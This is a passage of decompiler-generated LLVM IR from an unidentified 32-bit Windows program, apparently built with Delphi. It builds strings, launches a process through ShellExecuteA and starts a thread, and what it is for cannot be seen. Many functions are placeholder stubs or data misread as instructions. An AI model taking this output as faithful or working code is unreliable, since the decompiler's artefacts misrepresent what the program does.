  %18 = add i8 %17, -1, !insn.addr !1292
  %19 = add i32 %14, %8, !insn.addr !1293
  %20 = inttoptr i32 %19 to i8*, !insn.addr !1293
  store i8 %18, i8* %20, align 1, !insn.addr !1293
  br label %dec_label_pc_406162, !insn.addr !1293

dec_label_pc_406162:                              ; preds = %dec_label_pc_40614e, %dec_label_pc_406140
  %21 = add i32 %ebx.0.reload, 1, !insn.addr !1294
  %22 = add i32 %esi.0.reload, -1, !insn.addr !1295
  %23 = icmp eq i32 %22, 0, !insn.addr !1295
  %24 = icmp eq i1 %23, false, !insn.addr !1296
  store i32 %21, i32* %ebx.0.reg2mem, !insn.addr !1296
  store i32 %22, i32* %esi.0.reg2mem, !insn.addr !1296
  br i1 %24, label %dec_label_pc_406136, label %dec_label_pc_406166, !insn.addr !1296

dec_label_pc_406166:                              ; preds = %dec_label_pc_406162, %dec_label_pc_4060f0
  %25 = load i32, i32* %stack_var_-32, align 4, !insn.addr !1297
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1298
  %26 = call i32 @"@LStrClr"(), !insn.addr !1299
  ret i32 %26, !insn.addr !1300
}

define i32 @function_40617c() local_unnamed_addr {
dec_label_pc_40617c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1301
  ret i32 %0, !insn.addr !1301
}

define i32 @function_406181() local_unnamed_addr {
dec_label_pc_406181:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1302
}

define i32 @function_406183(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_406183:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1303
}

define i32 @function_40618c() local_unnamed_addr {
dec_label_pc_40618c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @"@Str0Long"(i32 %1, i32 %0), !insn.addr !1304
  %3 = call i32 @"@PStrNCpy"(), !insn.addr !1305
  %4 = call i32 @"@LStrFromString"(), !insn.addr !1306
  ret i32 %4, !insn.addr !1307
}

define i32 @function_4061c4() local_unnamed_addr {
dec_label_pc_4061c4:
  %ecx.0.reg2mem = alloca i32, !insn.addr !1308
  %esp.0.reg2mem = alloca i32, !insn.addr !1308
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %0 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1308
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1309
  store i32 5, i32* %ecx.0.reg2mem, !insn.addr !1309
  br label %dec_label_pc_4061cc, !insn.addr !1309

dec_label_pc_4061cc:                              ; preds = %dec_label_pc_4061cc, %dec_label_pc_4061c4
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %1 = add i32 %esp.0.reload, -4, !insn.addr !1310
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1310
  store i32 0, i32* %2, align 4, !insn.addr !1310
  %3 = add i32 %esp.0.reload, -8, !insn.addr !1311
  %4 = inttoptr i32 %3 to i32*, !insn.addr !1311
  store i32 0, i32* %4, align 4, !insn.addr !1311
  %5 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1312
  %6 = icmp eq i32 %5, 0, !insn.addr !1312
  %7 = icmp eq i1 %6, false, !insn.addr !1313
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !1313
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1313
  br i1 %7, label %dec_label_pc_4061cc, label %dec_label_pc_4061d3, !insn.addr !1313

dec_label_pc_4061d3:                              ; preds = %dec_label_pc_4061cc
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1314
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1314
  store i32 0, i32* %9, align 4, !insn.addr !1314
  %10 = add i32 %esp.0.reload, -16, !insn.addr !1315
  %11 = inttoptr i32 %10 to i32*, !insn.addr !1315
  %12 = add i32 %esp.0.reload, -20, !insn.addr !1316
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1316
  store i32 %0, i32* %13, align 4, !insn.addr !1316
  %14 = add i32 %esp.0.reload, -24, !insn.addr !1317
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1317
  store i32 4219659, i32* %15, align 4, !insn.addr !1317
  %16 = call i32 @__readfsdword(i32 0), !insn.addr !1318
  %17 = add i32 %esp.0.reload, -28, !insn.addr !1318
  %18 = inttoptr i32 %17 to i32*, !insn.addr !1318
  store i32 %16, i32* %18, align 4, !insn.addr !1318
  call void @__writefsdword(i32 0, i32 %17), !insn.addr !1319
  %19 = call i32 @"@LStrFromPChar"(), !insn.addr !1320
  %20 = call i32 @function_4060f0(), !insn.addr !1321
  %21 = call i32 @function_4036c8(), !insn.addr !1322
  %22 = call i32 @"@LStrFromPChar"(), !insn.addr !1323
  %23 = add i32 %esp.0.reload, -32, !insn.addr !1324
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1324
  %25 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1324
  store i32 %25, i32* %24, align 4, !insn.addr !1324
  %26 = call i32 @"@LStrCopy"(), !insn.addr !1325
  %27 = call i32 @"@LStrDelete"(), !insn.addr !1326
  %28 = add i32 %esp.0.reload, -36, !insn.addr !1327
  %29 = inttoptr i32 %28 to i32*, !insn.addr !1327
  %30 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1327
  store i32 %30, i32* %29, align 4, !insn.addr !1327
  %31 = call i32 @function_4034c8(), !insn.addr !1328
  %32 = call i32 @"@LStrCopy"(), !insn.addr !1329
  %33 = add i32 %esp.0.reload, -40, !insn.addr !1330
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1330
  store i32 ptrtoint ([6 x i8]* @global_var_406320 to i32), i32* %34, align 4, !insn.addr !1330
  %35 = call i32 @function_40618c(), !insn.addr !1331
  %36 = add i32 %esp.0.reload, -44, !insn.addr !1332
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1332
  %38 = add i32 %esp.0.reload, -48, !insn.addr !1333
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1333
  store i32 ptrtoint (i32* @global_var_406330 to i32), i32* %39, align 4, !insn.addr !1333
  %40 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1334
  %41 = add i32 %esp.0.reload, -52, !insn.addr !1334
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1334
  store i32 %40, i32* %42, align 4, !insn.addr !1334
  %43 = call i32 @"@LStrCatN"(), !insn.addr !1335
  %44 = add i32 %esp.0.reload, -56, !insn.addr !1336
  %45 = inttoptr i32 %44 to i32*, !insn.addr !1336
  store i32 0, i32* %45, align 4, !insn.addr !1336
  %46 = add i32 %esp.0.reload, -60, !insn.addr !1337
  %47 = inttoptr i32 %46 to i32*, !insn.addr !1337
  store i32 0, i32* %47, align 4, !insn.addr !1337
  %48 = call i32 @"@LStrCat3"(), !insn.addr !1338
  %49 = call i32 @function_4036c8(), !insn.addr !1339
  %50 = add i32 %esp.0.reload, -64, !insn.addr !1340
  %51 = inttoptr i32 %50 to i32*, !insn.addr !1340
  store i32 %49, i32* %51, align 4, !insn.addr !1340
  %52 = call i32 @"@LStrFromPChar"(), !insn.addr !1341
  %53 = call i32 @function_4060f0(), !insn.addr !1342
  %54 = call i32 @function_4036c8(), !insn.addr !1343
  %55 = add i32 %esp.0.reload, -68, !insn.addr !1344
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1344
  store i32 %54, i32* %56, align 4, !insn.addr !1344
  %57 = add i32 %esp.0.reload, -72, !insn.addr !1345
  %58 = inttoptr i32 %57 to i32*, !insn.addr !1345
  store i32 0, i32* %58, align 4, !insn.addr !1345
  %59 = call i32 @function_4060e8(), !insn.addr !1346
  %60 = add i32 %esp.0.reload, -76, !insn.addr !1347
  %61 = inttoptr i32 %60 to i32*, !insn.addr !1347
  store i32 1, i32* %61, align 4, !insn.addr !1347
  %62 = add i32 %esp.0.reload, -80, !insn.addr !1348
  %63 = inttoptr i32 %62 to i32*, !insn.addr !1348
  store i32 0, i32* %63, align 4, !insn.addr !1348
  %64 = add i32 %esp.0.reload, -84, !insn.addr !1349
  %65 = inttoptr i32 %64 to i32*, !insn.addr !1349
  store i32 0, i32* %65, align 4, !insn.addr !1349
  %66 = call i32 @"@LStrCat3"(), !insn.addr !1350
  %67 = call i32 @function_4036c8(), !insn.addr !1351
  %68 = add i32 %esp.0.reload, -88, !insn.addr !1352
  %69 = inttoptr i32 %68 to i32*, !insn.addr !1352
  store i32 %67, i32* %69, align 4, !insn.addr !1352
  %70 = add i32 %esp.0.reload, -92, !insn.addr !1353
  %71 = inttoptr i32 %70 to i32*, !insn.addr !1353
  store i32 ptrtoint ([5 x i8]* @global_var_406340 to i32), i32* %71, align 4, !insn.addr !1353
  %72 = add i32 %esp.0.reload, -96, !insn.addr !1354
  %73 = inttoptr i32 %72 to i32*, !insn.addr !1354
  store i32 0, i32* %73, align 4, !insn.addr !1354
  %74 = call i32* @ShellExecuteA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1355
  %75 = load i32, i32* %73, align 4, !insn.addr !1356
  call void @__writefsdword(i32 0, i32 %75), !insn.addr !1357
  store i32 4219666, i32* %69, align 4, !insn.addr !1358
  %76 = call i32 @"@LStrArrayClr"(), !insn.addr !1359
  ret i32 %76, !insn.addr !1360
}

define i32 @function_40630b() local_unnamed_addr {
dec_label_pc_40630b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1361
  ret i32 %0, !insn.addr !1361
}

define i32 @function_406310() local_unnamed_addr {
dec_label_pc_406310:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1362
}

define i32 @function_406312(i32 %arg1) local_unnamed_addr {
dec_label_pc_406312:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1363
}

define i32 @function_406337(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_406337:
  %esp.1.reg2mem = alloca i32, !insn.addr !1364
  %.pre-phi.reg2mem = alloca i32*, !insn.addr !1364
  %ecx.0.reg2mem = alloca i32, !insn.addr !1364
  %esp.0.reg2mem = alloca i32, !insn.addr !1364
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %5 = add i32 %2, 1, !insn.addr !1364
  %6 = inttoptr i32 %2 to i32*, !insn.addr !1364
  store i32 %5, i32* %6, align 4, !insn.addr !1364
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !1365
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !1365
  %11 = add i8 %8, %10, !insn.addr !1365
  %12 = inttoptr i32 %9 to i8*, !insn.addr !1365
  store i8 %11, i8* %12, align 1, !insn.addr !1365
  %13 = add i32 %2, 58, !insn.addr !1366
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1366
  %15 = load i8, i8* %14, align 1, !insn.addr !1366
  %16 = load i32, i32* %eax, align 4, !insn.addr !1366
  %17 = udiv i32 %16, 256, !insn.addr !1366
  %18 = trunc i32 %17 to i8, !insn.addr !1366
  %19 = add i8 %15, %18, !insn.addr !1366
  store i8 %19, i8* %14, align 1, !insn.addr !1366
  %20 = add i32 %0, 112, !insn.addr !1367
  %21 = inttoptr i32 %20 to i8*, !insn.addr !1367
  %22 = load i8, i8* %21, align 1, !insn.addr !1367
  %23 = trunc i32 %4 to i8, !insn.addr !1367
  %24 = add i8 %22, %23, !insn.addr !1367
  store i8 %24, i8* %21, align 1, !insn.addr !1367
  %25 = trunc i32 %3 to i16, !insn.addr !1368
  %26 = call i8 @__readgsbyte(i32 %1), !insn.addr !1368
  call void @__asm_outsb(i16 %25, i8 %26), !insn.addr !1368
  %27 = load i8, i8* %7, align 4, !insn.addr !1369
  %28 = load i32, i32* %eax, align 4
  %29 = trunc i32 %28 to i8, !insn.addr !1369
  %30 = add i8 %27, %29, !insn.addr !1369
  %31 = inttoptr i32 %28 to i8*, !insn.addr !1369
  store i8 %30, i8* %31, align 1, !insn.addr !1369
  %32 = load i8, i8* %7, align 4, !insn.addr !1370
  %33 = load i32, i32* %eax, align 4
  %34 = trunc i32 %33 to i8, !insn.addr !1370
  %35 = add i8 %32, %34, !insn.addr !1370
  %36 = inttoptr i32 %33 to i8*, !insn.addr !1370
  store i8 %35, i8* %36, align 1, !insn.addr !1370
  %37 = ptrtoint i32* %stack_var_0 to i32, !insn.addr !1371
  store i32 %37, i32* %esp.0.reg2mem, !insn.addr !1372
  store i32 11, i32* %ecx.0.reg2mem, !insn.addr !1372
  br label %dec_label_pc_406350, !insn.addr !1372

dec_label_pc_406350:                              ; preds = %dec_label_pc_406350, %dec_label_pc_406337
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %38 = add i32 %esp.0.reload, -4, !insn.addr !1373
  %39 = inttoptr i32 %38 to i32*, !insn.addr !1373
  store i32 0, i32* %39, align 4, !insn.addr !1373
  %40 = add i32 %esp.0.reload, -8, !insn.addr !1374
  %41 = inttoptr i32 %40 to i32*, !insn.addr !1374
  store i32 0, i32* %41, align 4, !insn.addr !1374
  %42 = add nsw i32 %ecx.0.reload, -1, !insn.addr !1375
  %43 = icmp eq i32 %42, 0, !insn.addr !1375
  %44 = icmp eq i1 %43, false, !insn.addr !1376
  store i32 %40, i32* %esp.0.reg2mem, !insn.addr !1376
  store i32 %42, i32* %ecx.0.reg2mem, !insn.addr !1376
  br i1 %44, label %dec_label_pc_406350, label %dec_label_pc_406357, !insn.addr !1376

dec_label_pc_406357:                              ; preds = %dec_label_pc_406350
  %45 = add i32 %esp.0.reload, -12, !insn.addr !1377
  %46 = inttoptr i32 %45 to i32*, !insn.addr !1377
  store i32 0, i32* %46, align 4, !insn.addr !1377
  %47 = add i32 %esp.0.reload, -20, !insn.addr !1378
  %48 = inttoptr i32 %47 to i32*, !insn.addr !1378
  store i32 %37, i32* %48, align 4, !insn.addr !1378
  %49 = add i32 %esp.0.reload, -24, !insn.addr !1379
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1379
  store i32 4220310, i32* %50, align 4, !insn.addr !1379
  %51 = call i32 @__readfsdword(i32 0), !insn.addr !1380
  %52 = add i32 %esp.0.reload, -28, !insn.addr !1380
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1380
  store i32 %51, i32* %53, align 4, !insn.addr !1380
  call void @__writefsdword(i32 0, i32 %52), !insn.addr !1381
  %54 = call i32 @"@LStrPos"(), !insn.addr !1382
  %55 = add i32 %esp.0.reload, -32, !insn.addr !1383
  %56 = inttoptr i32 %55 to i32*, !insn.addr !1383
  %57 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !1383
  store i32 %57, i32* %56, align 4, !insn.addr !1383
  %58 = call i32 @"@LStrCopy"(), !insn.addr !1384
  %59 = add i32 %esp.0.reload, -36, !insn.addr !1385
  %60 = inttoptr i32 %59 to i32*
  %61 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1385
  store i32 %61, i32* %60, align 4, !insn.addr !1385
  %62 = call i32 @function_4034c8(), !insn.addr !1386
  %63 = call i32 @"@LStrCopy"(), !insn.addr !1387
  %64 = add i32 %arg1, -1, !insn.addr !1388
  store i32 %64, i32* %eax, align 4, !insn.addr !1388
  store i32* %60, i32** %.pre-phi.reg2mem
  store i32 %59, i32* %esp.1.reg2mem
  switch i32 %arg1, label %dec_label_pc_40657b [
    i32 0, label %dec_label_pc_4063c9
    i32 1, label %dec_label_pc_406506
    i32 2, label %dec_label_pc_406570
  ]

dec_label_pc_4063c9:                              ; preds = %dec_label_pc_406357
  %65 = call i32 @function_4034c8(), !insn.addr !1389
  %66 = icmp slt i32 %65, 5, !insn.addr !1390
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1390
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1390
  br i1 %66, label %dec_label_pc_40657b, label %dec_label_pc_4063da, !insn.addr !1390

dec_label_pc_4063da:                              ; preds = %dec_label_pc_4063c9
  %67 = call i32 @"@LStrFromPChar"(), !insn.addr !1391
  %68 = call i32 @function_4060f0(), !insn.addr !1392
  %69 = add i32 %esp.0.reload, -40, !insn.addr !1393
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1393
  %71 = call i32 @"@LStrFromPChar"(), !insn.addr !1394
  %72 = call i32 @function_4060f0(), !insn.addr !1395
  %73 = add i32 %esp.0.reload, -44, !insn.addr !1396
  %74 = inttoptr i32 %73 to i32*, !insn.addr !1396
  %75 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1397
  %76 = add i32 %esp.0.reload, -48, !insn.addr !1397
  %77 = inttoptr i32 %76 to i32*, !insn.addr !1397
  store i32 %75, i32* %77, align 4, !insn.addr !1397
  %78 = add i32 %esp.0.reload, -52, !insn.addr !1398
  %79 = inttoptr i32 %78 to i32*, !insn.addr !1398
  store i32 ptrtoint (i32* @global_var_4065b8 to i32), i32* %79, align 4, !insn.addr !1398
  %80 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1399
  %81 = add i32 %esp.0.reload, -56, !insn.addr !1399
  %82 = inttoptr i32 %81 to i32*, !insn.addr !1399
  store i32 %80, i32* %82, align 4, !insn.addr !1399
  %83 = call i32 @"@LStrCatN"(), !insn.addr !1400
  %84 = add i32 %esp.0.reload, -60, !insn.addr !1401
  %85 = inttoptr i32 %84 to i32*, !insn.addr !1401
  %86 = add i32 %esp.0.reload, -64, !insn.addr !1402
  %87 = inttoptr i32 %86 to i32*, !insn.addr !1402
  store i32 4220356, i32* %87, align 4, !insn.addr !1402
  %88 = load i32, i32* %stack_var_-4, align 4, !insn.addr !1403
  %89 = add i32 %esp.0.reload, -68, !insn.addr !1403
  %90 = inttoptr i32 %89 to i32*, !insn.addr !1403
  store i32 %88, i32* %90, align 4, !insn.addr !1403
  %91 = add i32 %esp.0.reload, -72, !insn.addr !1404
  %92 = inttoptr i32 %91 to i32*, !insn.addr !1404
  store i32 4220372, i32* %92, align 4, !insn.addr !1404
  %93 = load i32, i32* %stack_var_-8, align 4, !insn.addr !1405
  %94 = add i32 %esp.0.reload, -76, !insn.addr !1405
  %95 = inttoptr i32 %94 to i32*, !insn.addr !1405
  store i32 %93, i32* %95, align 4, !insn.addr !1405
  %96 = add i32 %esp.0.reload, -80, !insn.addr !1406
  %97 = inttoptr i32 %96 to i32*, !insn.addr !1406
  store i32 4220388, i32* %97, align 4, !insn.addr !1406
  %98 = call i32 @function_407410(), !insn.addr !1407
  %99 = add i32 %esp.0.reload, -84, !insn.addr !1408
  %100 = inttoptr i32 %99 to i32*, !insn.addr !1408
  %101 = call i32 @"@LStrCatN"(), !insn.addr !1409
  %102 = add i32 %esp.0.reload, -88, !insn.addr !1410
  %103 = inttoptr i32 %102 to i32*, !insn.addr !1410
  %104 = add i32 %esp.0.reload, -92, !insn.addr !1411
  %105 = inttoptr i32 %104 to i32*
  %106 = ptrtoint i32* %stack_var_-40 to i32, !insn.addr !1411
  store i32 %106, i32* %105, align 4, !insn.addr !1411
  %107 = call i32 @"@LStrFromPChar"(), !insn.addr !1412
  %108 = call i32 @function_4060f0(), !insn.addr !1413
  %109 = call i32 @"@LStrPos"(), !insn.addr !1414
  %110 = add i32 %109, -1, !insn.addr !1415
  %111 = add i32 %esp.0.reload, -96, !insn.addr !1416
  %112 = inttoptr i32 %111 to i32*, !insn.addr !1416
  store i32 %110, i32* %112, align 4, !insn.addr !1416
  %113 = call i32 @"@LStrFromPChar"(), !insn.addr !1417
  %114 = call i32 @function_4060f0(), !insn.addr !1418
  %115 = call i32 @"@LStrCopy"(), !insn.addr !1419
  %116 = load i32, i32* %stack_var_-40, align 4, !insn.addr !1420
  store i32 %116, i32* %112, align 4, !insn.addr !1421
  %117 = call i32 @"@LStrFromPChar"(), !insn.addr !1422
  %118 = call i32 @function_4060f0(), !insn.addr !1423
  %119 = add i32 %esp.0.reload, -100, !insn.addr !1424
  %120 = inttoptr i32 %119 to i32*, !insn.addr !1424
  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1425
  %122 = call i32 @function_4060f0(), !insn.addr !1426
  %123 = call i32 @function_4057d0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1427
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1428
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1428
  br label %dec_label_pc_40657b, !insn.addr !1428

dec_label_pc_406506:                              ; preds = %dec_label_pc_406357
  %124 = call i32 @function_4034c8(), !insn.addr !1429
  %125 = icmp slt i32 %124, 5, !insn.addr !1430
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1430
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1430
  br i1 %125, label %dec_label_pc_40657b, label %dec_label_pc_406513, !insn.addr !1430

dec_label_pc_406513:                              ; preds = %dec_label_pc_406506
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1431
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1431
  store i32 ptrtoint ([5 x i8]* @global_var_406604 to i32), i32* %127, align 4, !insn.addr !1431
  %128 = call i32 @function_404b20(), !insn.addr !1432
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1433
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1433
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1434
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1434
  store i32 ptrtoint ([7 x i8]* @global_var_406614 to i32), i32* %132, align 4, !insn.addr !1434
  %133 = call i32 @function_404b20(), !insn.addr !1435
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1436
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1437
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1438
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1438
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1439
  %140 = call i32 @function_4060f0(), !insn.addr !1440
  %141 = call i32 @function_404c78(), !insn.addr !1441
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1442
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1442
  br label %dec_label_pc_40657b, !insn.addr !1442

dec_label_pc_406570:                              ; preds = %dec_label_pc_406357
  %142 = call i32 @function_4034c8(), !insn.addr !1443
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1444
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1444
  br label %dec_label_pc_40657b, !insn.addr !1444

dec_label_pc_40657b:                              ; preds = %dec_label_pc_406357, %dec_label_pc_406570, %dec_label_pc_406513, %dec_label_pc_406506, %dec_label_pc_4063da, %dec_label_pc_4063c9
  %143 = add i32 %esp.0.reload, -16, !insn.addr !1445
  %144 = inttoptr i32 %143 to i32*, !insn.addr !1445
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %145 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1446
  call void @__writefsdword(i32 0, i32 %145), !insn.addr !1447
  %146 = add i32 %esp.1.reload, 8, !insn.addr !1448
  %147 = inttoptr i32 %146 to i32*, !insn.addr !1448
  store i32 4220317, i32* %147, align 4, !insn.addr !1448
  %148 = call i32 @"@LStrArrayClr"(), !insn.addr !1449
  ret i32 %148, !insn.addr !1450
}

define i32 @function_406596() local_unnamed_addr {
dec_label_pc_406596:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1451
  ret i32 %0, !insn.addr !1451
}

define i32 @function_40659b() local_unnamed_addr {
dec_label_pc_40659b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1452
}

define i32 @function_40659d(i32 %arg1) local_unnamed_addr {
dec_label_pc_40659d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1453
}

define i32 @function_4065c7() local_unnamed_addr {
dec_label_pc_4065c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1454
}

define i32 @function_4065cf() local_unnamed_addr {
dec_label_pc_4065cf:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1455
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1455
  store i32 %1, i32* %2, align 4, !insn.addr !1455
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1456
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1456
  %7 = add i8 %4, %6, !insn.addr !1456
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1456
  store i8 %7, i8* %8, align 1, !insn.addr !1456
  %9 = load i8, i8* %3, align 4, !insn.addr !1457
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1457
  %12 = trunc i32 %11 to i8, !insn.addr !1457
  %13 = add i8 %9, %12, !insn.addr !1457
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1457
  store i8 %13, i8* %14, align 1, !insn.addr !1457
  %15 = load i32, i32* %eax, align 4, !insn.addr !1458
  ret i32 %15, !insn.addr !1458
}

define i32 @function_4065d6() local_unnamed_addr {
dec_label_pc_4065d6:
  %0 = call x86_fp80 @function_406614(i32 ptrtoint (i32* @0 to i32)), !insn.addr !1459
  %1 = fptrunc x86_fp80 %0 to float, !insn.addr !1459
  %2 = bitcast float %1 to i32, !insn.addr !1459
  ret i32 %2, !insn.addr !1459
}

define i32 @function_406612() local_unnamed_addr {
dec_label_pc_406612:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1460
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1460
  store i8 %2, i8* %3, align 1, !insn.addr !1460
  ret i32 %0, !insn.addr !1460
}

define x86_fp80 @function_406614(i32 %arg1) local_unnamed_addr {
dec_label_pc_406614:
  %ebx.1.reg2mem = alloca i32, !insn.addr !1461
  %esp.1.reg2mem = alloca i32, !insn.addr !1461
  %ebx.0.reg2mem = alloca i32, !insn.addr !1461
  %esp.0.reg2mem = alloca i32, !insn.addr !1461
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call x86_fp80 @__decompiler_undefined_function_9()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  br i1 %3, label %dec_label_pc_406678, label %dec_label_pc_406617, !insn.addr !1461

dec_label_pc_406617:                              ; preds = %dec_label_pc_406614
  %5 = icmp eq i1 %4, false, !insn.addr !1462
  br i1 %5, label %dec_label_pc_40668c, label %dec_label_pc_406619, !insn.addr !1462

dec_label_pc_406619:                              ; preds = %dec_label_pc_406617
  %6 = trunc i32 %1 to i16, !insn.addr !1463
  %7 = call i8 @__asm_in(i16 %6), !insn.addr !1463
  %8 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !1464
  %9 = add i32 %0, 12, !insn.addr !1465
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1465
  %11 = load i32, i32* %10, align 4, !insn.addr !1465
  %12 = icmp eq i32 %11, 74, !insn.addr !1466
  %13 = icmp eq i1 %12, false, !insn.addr !1467
  store i32 %8, i32* %esp.1.reg2mem, !insn.addr !1467
  store i32 %11, i32* %ebx.1.reg2mem, !insn.addr !1467
  br i1 %13, label %dec_label_pc_40667d, label %dec_label_pc_406629, !insn.addr !1467

dec_label_pc_406629:                              ; preds = %dec_label_pc_406619
  %14 = call i32 @"@LStrSetLength"(), !insn.addr !1468
  %15 = call i32 @function_403720(), !insn.addr !1469
  %16 = call i32 @function_4045ac(), !insn.addr !1470
  %17 = add i32 %0, 20, !insn.addr !1471
  %18 = inttoptr i32 %17 to %_SECURITY_ATTRIBUTES*, !insn.addr !1472
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1473
  store i32 0, i32* %stack_var_-56, align 4, !insn.addr !1474
  %20 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1474
  store i32 %20, i32* %esp.0.reg2mem, !insn.addr !1474
  store i32 %11, i32* %ebx.0.reg2mem, !insn.addr !1474
  br label %dec_label_pc_406678, !insn.addr !1474

dec_label_pc_406678:                              ; preds = %dec_label_pc_406629, %dec_label_pc_406614
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
